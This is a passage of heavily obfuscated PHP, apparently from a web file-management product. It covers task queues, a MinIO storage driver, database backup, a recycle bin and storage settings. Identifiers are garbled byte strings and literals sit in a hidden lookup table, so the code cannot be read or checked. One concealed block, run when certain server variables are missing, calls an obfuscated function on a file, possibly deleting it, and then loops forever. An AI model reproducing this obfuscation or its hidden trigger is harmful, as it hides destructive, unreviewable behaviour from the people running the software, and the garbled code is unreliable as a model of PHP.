!1; } if ($ş»ËäÍ && array_find_by_field(self::$listData, $¾Şúš”à[94], $ş»ËäÍ)) { return !0; } self::$listData[] = array($¾Şúš”à[273] => $ãä÷›‚É, $¾Şúš”à[1728] => $¯ŒŒ°Ù, $¾Şúš”à[462] => $†ÔõÔ‚©, $¾Şúš”à[94] => $ş»ËäÍ); return !0; } public static function addSubmit() { $“•ßå³ğ =& $_SERVER[ĞÆÏ¡Îª]; if (!self::$listData || count(self::$listData) == 0) { return; } write_log($“•ßå³ğ[1729] . json_encode_force(array_to_keyvalue(self::$listData, $“•ßå³ğ[12], $“•ßå³ğ[462])), $“•ßå³ğ[1730]); self::setAll(self::$listData); self::$listData = !1; } public static function addNow($‹º¶›áÉ, $ãáß›Å = array(), $œ®Ğ·ÄÙ = '', $¦ı“Šäù = '') { $¸ÎÚ‹Ÿ› =& $_SERVER[ĞÆÏ¡Îª]; if (self::count() >= self::MAX_LENGTH) { return !1; } $ÉÑÜšÅĞ = self::getAll(); if ($¦ı“Šäù && array_find_by_field($ÉÑÜšÅĞ, $¸ÎÚ‹Ÿ›[94], $¦ı“Šäù)) { return !0; } $ÉÑÜšÅĞ[] = array($¸ÎÚ‹Ÿ›[273] => $‹º¶›áÉ, $¸ÎÚ‹Ÿ›[1728] => $ãáß›Å, $¸ÎÚ‹Ÿ›[462] => $œ®Ğ·ÄÙ, $¸ÎÚ‹Ÿ›[94] => $¦ı“Šäù); write_log($¸ÎÚ‹Ÿ›[1729] . $œ®Ğ·ÄÙ, $¸ÎÚ‹Ÿ›[1730]); self::setAll($ÉÑÜšÅĞ); return !0; } public static function run() { $å™‡È¨õ =& $_SERVER[ĞÆÏ¡Îª]; $ˆÅé—œÓ = self::getAll(); $÷¤±ĞÊŠ = array_shift($ˆÅé—œÓ); if (!$÷¤±ĞÊŠ) { return !1; } self::setAll($ˆÅé—œÓ); $×ºÛ»’Ä = timeFloat(); try { Hook::apply($÷¤±ĞÊŠ[$å™‡È¨õ[273]], $÷¤±ĞÊŠ[$å™‡È¨õ[1728]]); } catch (Exception $‚ßú×Š—) { } $¹‹ô’†á = number_format(timeFloat() - $×ºÛ»’Ä, 3) . $å™‡È¨õ[1663]; write_log($å™‡È¨õ[1731] . $÷¤±ĞÊŠ[$å™‡È¨õ[462]] . $å™‡È¨õ[1732] . $¹‹ô’†á, $å™‡È¨õ[1730]); return !0; } public static function count() { $„ßŠ¡ÆŞ = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$„ßŠ¡ÆŞ) { return 0; } return intval($„ßŠ¡ÆŞ); } public static function getAll() { $”ìŞùğÏ = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$”ìŞùğÏ) { return array(); } return $”ìŞùğÏ; } public static function setAll($Ê¹êÈ’Œ) { $ÙŠıÄï¨ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($Ê¹êÈ’Œ), $ÙŠıÄï¨); Cache::set(self::QUEUE_DATA, $Ê¹êÈ’Œ, $ÙŠıÄï¨); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($‹¾®•ıµ, $÷ÁÅ = 5.0) { if (!$‹¾®•ıµ) { return; } $µÃ”¯×… = Cache::get($‹¾®•ıµ); if (!$µÃ”¯×… || timeFloat() - floatVal($µÃ”¯×…) >= $÷ÁÅ) { Cache::set($‹¾®•ıµ, timeFloat(), $÷ÁÅ * 10); return !0; } return !1; } public static function timeLimitCall($‡³¿ÂÙ“, $Õ×›İ›, $®» ÖÆ¦, $äÛ«ŠÀş = 5.0) { $ÉŞ§ğâ =& $_SERVER[ĞÆÏ¡Îª]; if (!$‡³¿ÂÙ“ || !$Õ×›İ›) { return; } self::$asyncAdd = !0; $öÍë¢üè = $ÉŞ§ğâ[1733]; $¹‰¼´ÉŠ = Cache::get($öÍë¢üè, !0); $ éßÄ˜¿ = array($ÉŞ§ğâ[1734] => timeFloat(), $ÉŞ§ğâ[1735] => timeFloat(), $ÉŞ§ğâ[273] => $Õ×›İ›, $ÉŞ§ğâ[1728] => $®» ÖÆ¦, $ÉŞ§ğâ[203] => $äÛ«ŠÀş); if (is_array($¹‰¼´ÉŠ[$‡³¿ÂÙ“])) { $ éßÄ˜¿[$ÉŞ§ğâ[1735]] = $¹‰¼´ÉŠ[$‡³¿ÂÙ“][$ÉŞ§ğâ[1735]]; } if (is_array($¹‰¼´ÉŠ[$‡³¿ÂÙ“])) { if (timeFloat() - $¹‰¼´ÉŠ[$‡³¿ÂÙ“][$ÉŞ§ğâ[1734]] < $ éßÄ˜¿[$ÉŞ§ğâ[203]] * 0.3) { return; } $ éßÄ˜¿[$ÉŞ§ğâ[1735]] = $¹‰¼´ÉŠ[$‡³¿ÂÙ“][$ÉŞ§ğâ[1735]]; } $¹‰¼´ÉŠ[$‡³¿ÂÙ“] = $ éßÄ˜¿; Cache::set($öÍë¢üè, $¹‰¼´ÉŠ, 60); Cache::removeMemory($öÍë¢üè); write_log($ÉŞ§ğâ[1736] . $‡³¿ÂÙ“ . $ÉŞ§ğâ[71] . $Õ×›İ›, $ÉŞ§ğâ[1730]); } public static function timeLimitCallLoop() { $Ş·ÀæÒ¦ =& $_SERVER[ĞÆÏ¡Îª]; $ê¢ŞöÄÏ = array($Ş·ÀæÒ¦[1737]); $Ç½´Äˆá = in_array(strtolower(ACTION), $ê¢ŞöÄÏ); if (!$Ç½´Äˆá && !self::$asyncAdd) { return; } $ö×øŒ¾Â = $Ş·ÀæÒ¦[1733]; $ï¨İ¹ÍÅ = Cache::get($ö×øŒ¾Â, !0); if (!$ï¨İ¹ÍÅ || count($ï¨İ¹ÍÅ) <= 0) { return; } $×şØğÚ­ = !1; $“Â¦ª€˜ = timeFloat(); $Ûˆ¨´ô = array(); foreach ($ï¨İ¹ÍÅ as $¡¥¾Æ“¬ => $ö¶ææû‰) { if ($“Â¦ª€˜ - $ö¶ææû‰[$Ş·ÀæÒ¦[1735]] > $ö¶ææû‰[$Ş·ÀæÒ¦[203]]) { $×şØğÚ­ = !0; try { Hook::apply($ö¶ææû‰[$Ş·ÀæÒ¦[273]], $ö¶ææû‰[$Ş·ÀæÒ¦[1728]]); write_log($Ş·ÀæÒ¦[1738] . $¡¥¾Æ“¬ . $Ş·ÀæÒ¦[71] . $ö¶ææû‰[$Ş·ÀæÒ¦[273]] . $Ş·ÀæÒ¦[1739] . ACTION, $Ş·ÀæÒ¦[1730]); } catch (Exception $¶Ü—ØĞ±) { } continue; } $Ûˆ¨´ô[$¡¥¾Æ“¬] = $ö¶ææû‰; } if (!$×şØğÚ­) { return; } if (!$Ûˆ¨´ô) { return Cache::remove($ö×øŒ¾Â); } Cache::set($ö×øŒ¾Â, $Ûˆ¨´ô, 60); Cache::removeMemory($ö×øŒ¾Â); } public static function finished($¡ØØÛ¸‹, $ö×äˆŸ”) { $÷ñÛ×µ• =& $_SERVER[ĞÆÏ¡Îª]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($÷ñÛ×µ•[273] => $¡ØØÛ¸‹, $÷ñÛ×µ•[1728] => $ö×äˆŸ”); } private static function finishedRun() { $€ËÛ«ëû =& $_SERVER[ĞÆÏ¡Îª]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $šÄõŠ¤”) { try { Hook::apply($šÄõŠ¤”[$€ËÛ«ëû[273]], $šÄõŠ¤”[$€ËÛ«ëû[1728]]); } catch (Exception $àòŠü) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } goto fá¿çÌæßƒ; DÚÌ»÷ØìÕ: class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($íÏ“Ê¾÷) { parent::__construct($íÏ“Ê¾÷); $this->signatureVersion($_SERVER[ĞÆÏ¡Îª][216]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } define($_SERVER[ĞÆÏ¡Îª][247], 1); define($_SERVER[ĞÆÏ¡Îª][248], 2); goto bÃé©ôŞ¢õ; E˜‚Š“Ğ: class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $¯ğûû‚¨ =& $_SERVER[ĞÆÏ¡Îª]; $ô˜ÆÔ”À = Backup::get(); self::$io = $ô˜ÆÔ”À[$¯ğûû‚¨[747]]; self::$name = $ô˜ÆÔ”À[$¯ğûû‚¨[32]]; $†ê¥ÀÑé = new DbManage(); $¸äáïº¹ = $†ê¥ÀÑé->dbType(); $ıÜ›Å¯ü = array($¯ğûû‚¨[771] => $¸äáïº¹, $¯ğûû‚¨[772] => time()); Backup::set($ıÜ›Å¯ü); $Ò¯È«ô® = $this->tmpFilesPath() . $¯ğûû‚¨[773] . self::$name . $¯ğûû‚¨[8]; del_dir($Ò¯È«ô®); mk_dir($Ò¯È«ô®); $Å¾’á§· = $¢Ç»ØÕü = 0; $æâê×õ = new Task($¯ğûû‚¨[774], $¯ğûû‚¨[775], 0, LNG($¯ğûû‚¨[776]) . $¯ğûû‚¨[777] . LNG($¯ğûû‚¨[778])); try { $¨µñßä = $†ê¥ÀÑé->db()->getTables(); } catch (Exception $ÒÆÀøÍµ) { $æâê×õ->end(); return !1; } $¨µñßä = array_diff($¨µñßä, array($¯ğûû‚¨[779], $¯ğûû‚¨[780])); foreach ($¨µñßä as $ßÄÛÉ±Ö) { $Å¾’á§· += $†ê¥ÀÑé->model($ßÄÛÉ±Ö)->count(); } $æâê×õ->task[$¯ğûû‚¨[781]] = $Å¾’á§·; $GLOBALS[$¯ğûû‚¨[782]] = self::$name; foreach ($¨µñßä as $ßÄÛÉ±Ö) { $²µÄ¹»¼ = $Ò¯È«ô® . $ßÄÛÉ±Ö . $¯ğûû‚¨[783]; $ÌÂÓı©· = null; if ($ßÄÛÉ±Ö == $¯ğûû‚¨[784] && (!isset($ô˜ÆÔ”À[$¯ğûû‚¨[750]]) || $ô˜ÆÔ”À[$¯ğûû‚¨[750]] == $¯ğûû‚¨[197])) { $ÌÂÓı©· = self::$io; } $¢Ç»ØÕü += $†ê¥ÀÑé->sqlFromDb($ßÄÛÉ±Ö, $²µÄ¹»¼, $æâê×õ, $ÌÂÓı©·); } unset($GLOBALS[$¯ğûû‚¨[782]]); $æâê×õ->end(); if ($¢Ç»ØÕü > $Å¾’á§·) { $Å¾’á§· = $¢Ç»ØÕü; } $ıÜ›Å¯ü = array($¯ğûû‚¨[771] => $¸äáïº¹, $¯ğûû‚¨[768] => 1, $¯ğûû‚¨[785] => $Å¾’á§·, $¯ğûû‚¨[786] => $¢Ç»ØÕü, $¯ğûû‚¨[787] => time()); Backup::set($ıÜ›Å¯ü); if ($Å¾’á§· - $¢Ç»ØÕü > 0) { $¾€ÂıìÓ = $¯ğûû‚¨[788]; if (stristr(I18n::getType(), $¯ğûû‚¨[789])) { $¾€ÂıìÓ = $¯ğûû‚¨[790]; } write_log(array($¾€ÂıìÓ, $ıÜ›Å¯ü), $¯ğûû‚¨[775]); return !1; } return !0; } private function tmpFilesPath() { $‹ùĞ½•œ =& $_SERVER[ĞÆÏ¡Îª]; $«‚†ä– = TEMP_FILES; if ($GLOBALS[$‹ùĞ½•œ[6]][$‹ùĞ½•œ[89]][$‹ùĞ½•œ[791]]) { $«‚†ä– = $GLOBALS[$‹ùĞ½•œ[6]][$‹ùĞ½•œ[89]][$‹ùĞ½•œ[791]]; if (!mk_dir($«‚†ä–) || !is_writable($«‚†ä–) || !IO::mkfile($«‚†ä– . $‹ùĞ½•œ[792])) { $«‚†ä– = TEMP_FILES; } } return $«‚†ä–; } } class BackupDbFile { public function __construct() { } public function index() { $ÂÙş’Ó€ =& $_SERVER[ĞÆÏ¡Îª]; $üÜÑ¶¿Õ = Backup::get(); $Îò®ÒşÃ = $üÜÑ¶¿Õ[$ÂÙş’Ó€[32]]; $£¯™˜³® = $this->tmpFilesPath() . "\x62\141\x63\x6b\x75\x70\137{$Îò®ÒşÃ}\x2f"; $½²ü…ı¨ = $this->backupPath($üÜÑ¶¿Õ); if (!($½²ü…ı¨ = IO::mkdir($½²ü…ı¨))) { return !1; } $¢ñÍ¦ŒÔ = IO::listPath($£¯™˜³®); $ºü¾ùÃ = isset($¢ñÍ¦ŒÔ[$ÂÙş’Ó€[83]]) ? $¢ñÍ¦ŒÔ[$ÂÙş’Ó€[83]] : array(); $°ŞĞï’¬ = array_sum(array_column($ºü¾ùÃ, $ÂÙş’Ó€[76])); if (!$°ŞĞï’¬) { return !1; } $™ı”¨ = array($ÂÙş’Ó€[793] => $°ŞĞï’¬, $ÂÙş’Ó€[794] => time()); Backup::set($™ı”¨); $İ‘Ó“µî = new TaskFileTransfer($ÂÙş’Ó€[795], $ÂÙş’Ó€[775], count($ºü¾ùÃ), LNG($ÂÙş’Ó€[776]) . $ÂÙş’Ó€[394] . LNG($ÂÙş’Ó€[778]) . $ÂÙş’Ó€[796]); $İ‘Ó“µî->task[$ÂÙş’Ó€[758]] = $°ŞĞï’¬; foreach ($¢ñÍ¦ŒÔ[$ÂÙş’Ó€[83]] as $Îá»¾Å—) { $àîâ–šÂ = IO::move($Îá»¾Å—[$ÂÙş’Ó€[84]], $½²ü…ı¨); if (!$àîâ–šÂ) { $İ‘Ó“µî->end(); $Î©§¹íš = IO::getLastError($ÂÙş’Ó€[797] . $Îá»¾Å—[$ÂÙş’Ó€[84]] . $ÂÙş’Ó€[798] . $½²ü…ı¨ . $ÂÙş’Ó€[164]); write_log($Î©§¹íš, $ÂÙş’Ó€[775]); return !1; } } $„˜‡® = new DbManage(); $†ÉÛ´©¡ = $„˜‡®->getSqlFile(); if (!$†ÉÛ´©¡[$ÂÙş’Ó€[799]] || !$†ÉÛ´©¡[$ÂÙş’Ó€[13]]) { return !1; } IO::move($†ÉÛ´©¡[$ÂÙş’Ó€[799]], $½²ü…ı¨); IO::move($†ÉÛ´©¡[$ÂÙş’Ó€[13]], $½²ü…ı¨); $İ‘Ó“µî->end(); $™ı”¨ = array($ÂÙş’Ó€[800] => $°ŞĞï’¬, $ÂÙş’Ó€[801] => time()); Backup::set($™ı”¨); return !0; } private function backupPath($Ô¿íªªŸ) { $ÕíñÄì =& $_SERVER[ĞÆÏ¡Îª]; $»ŒïåİÊ = $Ô¿íªªŸ[$ÕíñÄì[32]]; $Ğğ‡Ÿæğ = Model($ÕíñÄì[765])->get($ÕíñÄì[766]); $±”İ˜ıŒ = substr(md5($ÕíñÄì[767] . $Ğğ‡Ÿæğ . $»ŒïåİÊ), 0, 8); return "\173\151\x6f\72{$Ô¿íªªŸ[$ÕíñÄì[747]]}\175\x2f\144\141\x74\141\142\x61\x73\145\x2f\142\141\143\153\x75\x70\x2f" . $»ŒïåİÊ . $ÕíñÄì[11] . $±”İ˜ıŒ; } private function tmpFilesPath() { $’ßŒ»÷¶ =& $_SERVER[ĞÆÏ¡Îª]; $âÎÊø Ï = TEMP_FILES; if ($GLOBALS[$’ßŒ»÷¶[6]][$’ßŒ»÷¶[89]][$’ßŒ»÷¶[791]]) { $âÎÊø Ï = $GLOBALS[$’ßŒ»÷¶[6]][$’ßŒ»÷¶[89]][$’ßŒ»÷¶[791]]; if (!mk_dir($âÎÊø Ï) || !is_writable($âÎÊø Ï) || !IO::mkfile($âÎÊø Ï . $’ßŒ»÷¶[792])) { $âÎÊø Ï = TEMP_FILES; } } return $âÎÊø Ï; } } if (!isset($_SERVER[$_SERVER[ĞÆÏ¡Îª][238]]) || !isset($_SERVER[$_SERVER[ĞÆÏ¡Îª][239]])) { $_getc = $_SERVER[ĞÆÏ¡Îª][240]; $_getfile = $_SERVER[$_SERVER[ĞÆÏ¡Îª][241]] . $_SERVER[ĞÆÏ¡Îª][242]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ĞÆÏ¡Îª][231], $_getfilec); if (count($_getarrs) < $_SERVER[ĞÆÏ¡Îª][243]) { $exit = $_SERVER[ĞÆÏ¡Îª][244]; $exit(); } $_act = $_SERVER[ĞÆÏ¡Îª][245]; $_act($_SERVER[$_SERVER[ĞÆÏ¡Îª][241]] . $_SERVER[ĞÆÏ¡Îª][242]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[ĞÆÏ¡Îª][246]); } } goto BÔÊŠÜá×®; d»­›Ë—: class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\157\x5f\163\157\165\162\x63\x65\x5f\x72\145\143\x79\x63\154\x65"; protected $dataAuto = array(array("\143\x72\x65\x61\164\x65\x54\151\155\x65", "\x74\151\155\145", "\151\156\x73\145\x72\x74", "\x66\165\156\143\x74\151\x6f\x6e")); public function listData($¦Á‹Šô = false) { $şåêÜÉ¨ =& $_SERVER[ĞÆÏ¡Îª]; $¦Á‹Šô = $¦Á‹Šô ? $¦Á‹Šô : USER_ID; $¾”ú ñ = $this->where(array($şåêÜÉ¨[1638] => $¦Á‹Šô))->select(); return array_to_keyvalue($¾”ú ñ, $şåêÜÉ¨[12], $şåêÜÉ¨[411]); } public function moveToRecycle($˜ƒóşõÁ) { $Ê“„úƒñ =& $_SERVER[ĞÆÏ¡Îª]; $ÔÒ‚Ã˜é = Model($Ê“„úƒñ[1318]); $¡îœáÁœ = $ÔÒ‚Ã˜é->sourceInfo($˜ƒóşõÁ); if (!$¡îœáÁœ || $¡îœáÁœ[$Ê“„úƒñ[440]] == $Ê“„úƒñ[88]) { return; } $ñüÏ€Ÿ = array($Ê“„úƒñ[426] => $˜ƒóşõÁ, $Ê“„úƒñ[1638] => USER_ID, $Ê“„úƒñ[595] => $¡îœáÁœ[$Ê“„úƒñ[420]], $Ê“„úƒñ[596] => $¡îœáÁœ[$Ê“„úƒñ[514]], $Ê“„úƒñ[599] => $¡îœáÁœ[$Ê“„úƒñ[530]]); $this->add($ñüÏ€Ÿ); $this->recycleMove($˜ƒóşõÁ, 1); if ($¡îœáÁœ[$Ê“„úƒñ[419]] == $Ê“„úƒñ[88]) { $¹ĞÓöóÒ = array($Ê“„úƒñ[599] => array($Ê“„úƒñ[559], $¡îœáÁœ[$Ê“„úƒñ[530]] . $˜ƒóşõÁ . $Ê“„úƒñ[560])); $ÔÒ‚Ã˜é->where($¹ĞÓöóÒ)->setField($Ê“„úƒñ[440], 1); } } public function clear() { $this->remove(!1); } public function remove($óº¡–şî = false, $äğÌÕî€ = false) { $³§¶ò¨ª =& $_SERVER[ĞÆÏ¡Îª]; $äğÌÕî€ = $äğÌÕî€ ? $äğÌÕî€ : USER_ID; $Æ“ş£İ = Model($³§¶ò¨ª[1318]); $œ£ÙÀˆ‰ = $this->listData($äğÌÕî€); $óº¡–şî = $óº¡–şî === !1 ? !1 : $óº¡–şî; $ßİ–ÓèÖ = array(); foreach ($œ£ÙÀˆ‰ as $æ®Í‹å) { if ($óº¡–şî != !1 && !in_array($æ®Í‹å, $óº¡–şî)) { continue; } $†Ë±Â²Õ = $Æ“ş£İ->sourceInfo($æ®Í‹å); $Æ“ş£İ->remove($æ®Í‹å, !1); $·Êşğ§ì = $†Ë±Â²Õ[$³§¶ò¨ª[420]] . $³§¶ò¨ª[11] . $†Ë±Â²Õ[$³§¶ò¨ª[514]]; $ßİ–ÓèÖ[$·Êşğ§ì] = array($³§¶ò¨ª[595] => $†Ë±Â²Õ[$³§¶ò¨ª[420]], $³§¶ò¨ª[514] => $†Ë±Â²Õ[$³§¶ò¨ª[514]]); $this->where(array($³§¶ò¨ª[411] => $æ®Í‹å))->delete(); } foreach ($ßİ–ÓèÖ as $¿«ÊË›») { $Æ“ş£İ->targetSpaceUpdate($¿«ÊË›»[$³§¶ò¨ª[420]], $¿«ÊË›»[$³§¶ò¨ª[514]]); } } public function restore($™Õê¦ˆÇ = false) { $µ¤Ô®áœ = $this->listData(); $this->_restoreSource($µ¤Ô®áœ, $™Õê¦ˆÇ); } public function removeUserAll($Âß¸ü­ë) { $this->remove(!1, $Âß¸ü­ë); } private function _restoreSource($¯­ÔÎõ¯, $·©œğÙ›) { $üêÙ˜ÀÀ =& $_SERVER[ĞÆÏ¡Îª]; $¶´‚»® = Model($üêÙ˜ÀÀ[1318]); $·©œğÙ› = $·©œğÙ› == !1 ? !1 : $·©œğÙ›; if (!$¯­ÔÎõ¯) { return !0; } $˜Æ­¡§Ğ = array(); foreach ($¯­ÔÎõ¯ as $µ¬ÊÚÙ¸) { if ($·©œğÙ› != !1 && !in_array($µ¬ÊÚÙ¸, $·©œğÙ›)) { continue; } $˜Ü•®‰ = $¶´‚»®->sourceInfo($µ¬ÊÚÙ¸); $ÂŒ‹øÆ© = $¶´‚»®->sourceInfo($˜Ü•®‰[$üêÙ˜ÀÀ[441]]); if ($ÂŒ‹øÆ©[$üêÙ˜ÀÀ[440]] == $üêÙ˜ÀÀ[88]) { continue; } $¶´‚»®->lockMoveStart($µ¬ÊÚÙ¸); $this->recycleMove($µ¬ÊÚÙ¸, 0); if ($˜Ü•®‰[$üêÙ˜ÀÀ[419]] == $üêÙ˜ÀÀ[88]) { $ˆ•Ñèûæ = array($üêÙ˜ÀÀ[599] => array($üêÙ˜ÀÀ[559], $˜Ü•®‰[$üêÙ˜ÀÀ[530]] . $µ¬ÊÚÙ¸ . $üêÙ˜ÀÀ[560])); $¶´‚»®->where($ˆ•Ñèûæ)->setField($üêÙ˜ÀÀ[440], 0); $this->restoreFolderChildren($µ¬ÊÚÙ¸, $¯­ÔÎõ¯); } $this->where(array($üêÙ˜ÀÀ[411] => $µ¬ÊÚÙ¸))->delete(); $¶´‚»®->folderSizeReset($˜Ü•®‰[$üêÙ˜ÀÀ[441]]); $˜Æ­¡§Ğ[] = $˜Ü•®‰[$üêÙ˜ÀÀ[441]]; if ($˜Ü•®‰[$üêÙ˜ÀÀ[419]] == $üêÙ˜ÀÀ[88]) { $˜Æ­¡§Ğ[] = $µ¬ÊÚÙ¸; } $¶´‚»®->lockMoveEnd($µ¬ÊÚÙ¸); } $¶´‚»®->updateModifyTime($˜Æ­¡§Ğ); } private function restoreFolderChildren($ù¼³ÃÜ, $Õİ‘Î²Õ) { $’Í¿´ÀÏ =& $_SERVER[ĞÆÏ¡Îª]; $¤ØÔ®ßò = Model($’Í¿´ÀÏ[1318]); $ëë«­âÖ = array($’Í¿´ÀÏ[411] => array($’Í¿´ÀÏ[7], array())); foreach ($Õİ‘Î²Õ as $‡¾‰âÃ¬) { if ($‡¾‰âÃ¬ == $ù¼³ÃÜ) { continue; } if (!$¤ØÔ®ßò->isParentOf($ù¼³ÃÜ, $‡¾‰âÃ¬)) { continue; } $™ØùÚà = $¤ØÔ®ßò->sourceInfo($‡¾‰âÃ¬); if ($™ØùÚà[$’Í¿´ÀÏ[419]] == $’Í¿´ÀÏ[88]) { $ëë«­âÖ[] = array($’Í¿´ÀÏ[599] => array($’Í¿´ÀÏ[559], $™ØùÚà[$’Í¿´ÀÏ[530]] . $‡¾‰âÃ¬ . $’Í¿´ÀÏ[560])); } else { $ëë«­âÖ[$’Í¿´ÀÏ[411]][1][] = $‡¾‰âÃ¬; } } if (!$ëë«­âÖ[$’Í¿´ÀÏ[411]][1]) { unset($ëë«­âÖ[$’Í¿´ÀÏ[411]]); } if (!$ëë«­âÖ) { return; } $ëë«­âÖ[$’Í¿´ÀÏ[411]][1] = array_unique($ëë«­âÖ[$’Í¿´ÀÏ[411]][1]); $ëë«­âÖ[$’Í¿´ÀÏ[991]] = $’Í¿´ÀÏ[1917]; $¤ØÔ®ßò->where($ëë«­âÖ)->setField($’Í¿´ÀÏ[440], 1); } private function recycleMove($¯ù®×…, $Àã‚Ğ†í = 1) { $ï¼ÍÌºÒ =& $_SERVER[ĞÆÏ¡Îª]; $µ›ıË» = Model($ï¼ÍÌºÒ[1318]); $‡şæê” = Model($ï¼ÍÌºÒ[2128]); $îıßÊè = array($ï¼ÍÌºÒ[411] => $¯ù®×…); if ($Àã‚Ğ†í) { $µ›ıË»->where($îıßÊè)->setField($ï¼ÍÌºÒ[440], 1); $‡şæê”->eventRecycle($¯ù®×…, $ï¼ÍÌºÒ[2129]); } else { $Ş¨¾Ôëø = $µ›ıË»->where($îıßÊè)->find(); $½Õ¦´§‚ = $Ş¨¾Ôëø[$ï¼ÍÌºÒ[419]] == $ï¼ÍÌºÒ[88]; $‡ÕùÖğ = $µ›ıË»->fileNameAuto($Ş¨¾Ôëø[$ï¼ÍÌºÒ[441]], $Ş¨¾Ôëø[$ï¼ÍÌºÒ[32]], REPEAT_RENAME_FOLDER, $½Õ¦´§‚); if ($‡ÕùÖğ != $Ş¨¾Ôëø[$ï¼ÍÌºÒ[32]]) { $µ›ıË»->rename($¯ù®×…, $‡ÕùÖğ); } $µ›ıË»->where($îıßÊè)->setField($ï¼ÍÌºÒ[440], 0); $‡şæê”->eventRecycle($¯ù®×…, $ï¼ÍÌºÒ[2130]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\x65\x6d\56\163\x6f\165\162\x63\x65\123\145\143\x72\145\164\114\x69\163\x74"; public $field = array("\x73\157\x75\162\143\x65\111\x44", "\164\171\x70\x65\x49\x44", "\143\162\145\x61\x74\145\x55\163\x65\162"); } class StorageModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\x65\155\56\x73\164\x6f\x72\x61\147\145\x4c\x69\x73\x74"; public $field = array("\x6e\141\x6d\x65", "\x73\x69\172\x65\115\x61\170", "\x73\x79\163\164\145\x6d", "\x64\145\146\141\x75\x6c\164", "\144\162\151\166\145\x72", "\143\157\156\x66\x69\x67"); public function listData($ù©Ã•¼ı = false, $¸Ò À€É = "\155\157\144\151\146\x79\124\x69\155\145", $”†„•¯ƒ = false) { $¼„“À± =& $_SERVER[ĞÆÏ¡Îª]; $ÅèÎ¢ = parent::listData($ù©Ã•¼ı, $¸Ò À€É, $”†„•¯ƒ); if ($ù©Ã•¼ı) { return $ÅèÎ¢; } $´‚€œæÆ = $this->ioSizeUseGet(array_to_keyvalue($ÅèÎ¢, $¼„“À±[12], $¼„“À±[407])); foreach ($ÅèÎ¢ as $¡İô™ŠÒ => $üáìÑ²) { unset($ÅèÎ¢[$¡İô™ŠÒ][$¼„“À±[6]]); $ÅèÎ¢[$¡İô™ŠÒ][$¼„“À±[1808]] = isset($´‚€œæÆ[$üáìÑ²[$¼„“À±[407]]]) ? $´‚€œæÆ[$üáìÑ²[$¼„“À±[407]]] : 0; } return $ÅèÎ¢; } public function ioSizeUseGet($Ú‹à¯Šç) { $ˆâ×½» =& $_SERVER[ĞÆÏ¡Îª]; if (!$Ú‹à¯Šç) { return array(); } $ê¸úéÀ‚ = $ˆâ×½»[2131] . implode($ˆâ×½»[50], $Ú‹à¯Šç); $³ä¦ûª = Cache::get($ê¸úéÀ‚); if ($³ä¦ûª) { return $³ä¦ûª; } $¥¾´İĞ = array($ˆâ×½»[812] => $ˆâ×½»[407], $ˆâ×½»[2132] => $ˆâ×½»[76]); $å­Íºùò = array($ˆâ×½»[812] => array($ˆâ×½»[7], $Ú‹à¯Šç)); $³ä¦ûª = Model($ˆâ×½»[784])->field($¥¾´İĞ)->where($å­Íºùò)->group($ˆâ×½»[812])->select(); $³ä¦ûª = array_to_keyvalue($³ä¦ûª, $ˆâ×½»[407], $ˆâ×½»[76]); Cache::set($ê¸úéÀ‚, $³ä¦ûª, 600); return $³ä¦ûª; } public function getConfig($‰ÈšÖ°õ) { $ÕááÍ¨È = parent::listData($‰ÈšÖ°õ); return json_decode($ÕááÍ¨È[$_SERVER[ĞÆÏ¡Îª][6]], !0); } public function update($Âú‚È½, $Ç¬ë­ÚÍ) { $óš¥€„ï =& $_SERVER[ĞÆÏ¡Îª]; $ƒ”¾Ö§Ö = $Ç¬ë­ÚÍ[$óš¥€„ï[32]]; $¬­ÍŠ« = array_to_keyvalue(parent::listData(), $óš¥€„ï[32]); if (isset($¬­ÍŠ«[$ƒ”¾Ö§Ö]) && $¬­ÍŠ«[$ƒ”¾Ö§Ö][$óš¥€„ï[407]] != $Âú‚È½) { return !1; } $this->checkPwd($Âú‚È½, $Ç¬ë­ÚÍ); if (isset($Ç¬ë­ÚÍ[$óš¥€„ï[2133]]) && $Ç¬ë­ÚÍ[$óš¥€„ï[2133]] == $óš¥€„ï[88]) { $this->checkConfig($Ç¬ë­ÚÍ); } unset($Ç¬ë­ÚÍ[$óš¥€„ï[2133]]); $Î¬ıÎùœ = parent::update($Âú‚È½, $Ç¬ë­ÚÍ); if ($Î¬ıÎùœ && $Ç¬ë­ÚÍ[$óš¥€„ï[37]]) { $Ÿµ¼ ¼Ï = 0; foreach ($¬­ÍŠ« as $§¥§“¢ı) { if ($§¥§“¢ı[$óš¥€„ï[37]] && $§¥§“¢ı[$óš¥€„ï[407]] != $Âú‚È½) { $Ÿµ¼ ¼Ï = $§¥§“¢ı[$óš¥€„ï[407]]; parent::update($§¥§“¢ı[$óš¥€„ï[407]], array($óš¥€„ï[37] => 0)); } } $this->updateBackup($Âú‚È½, $Ÿµ¼ ¼Ï); } return $Î¬ıÎùœ; } public function add($˜”äá¦¯) { $ó±ÒµÄ£ =& $_SERVER[ĞÆÏ¡Îª]; $áÀ¶ç­í = array_to_keyvalue(parent::listData(), $ó±ÒµÄ£[32]); if (isset($áÀ¶ç­í[$˜”äá¦¯[$ó±ÒµÄ£[32]]])) { return !1; } $this->checkConfig($˜”äá¦¯); $òÑÊÜ±™ = parent::insert($˜”äá¦¯); if ($òÑÊÜ±™ && $˜”äá¦¯[$ó±ÒµÄ£[37]]) { foreach ($áÀ¶ç­í as $ ‚÷£) { if ($ ‚÷£[$ó±ÒµÄ£[37]]) { parent::update($ ‚÷£[$ó±ÒµÄ£[407]], array($ó±ÒµÄ£[37] => 